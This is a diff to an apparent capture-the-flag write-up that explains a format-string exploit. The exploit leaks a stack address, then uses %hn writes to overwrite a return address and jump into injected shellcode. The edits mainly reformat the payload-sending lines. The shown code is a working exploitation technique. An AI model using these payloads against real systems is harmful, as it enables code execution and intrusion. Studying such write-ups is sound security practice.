@@ -70,9 +70,13 @@ To be safe we assume there is aslr enabled on the server. We also need to utiliz
 >log.info('stack: %x'%addr)
 >addr = addr&0xFFFF #we take only last 4 bytes so that we can make use the %hn format
 >
->r.send('%.'+str(addr)+'u%4$hn\n') ##write those bytes
+>r.send('%.{0!s}u%4$hn\n'.format(addr)) ##write those bytes
 >```
 So now we have a pointer to the location of the return address, so we simply need to wrap around to that pointer and write to it. 
+>>>```python
+>lower = bufaddr&0xffff
+>r.send(shellcode+'%.'+str(lower-len(shellcode))+'u%12$hn\n')
+>```
 
 Putting it together:
 
@@ -93,7 +97,7 @@ addr = int(r.recv(0xa),16)+(OFFSET)
 log.info('stack: %x'%addr)
 addr = addr&0xFFFF 
 
-r.send('%.'+str(addr)+'u%4$hn\n') ##write those bytes
+r.send('%.{0!s}u%4$hn\n'.format(addr))
 lower = bufaddr&0xffff
 r.send(shellcode+'%.'+str(lower-len(shellcode))+'u%12$hn\n')
 
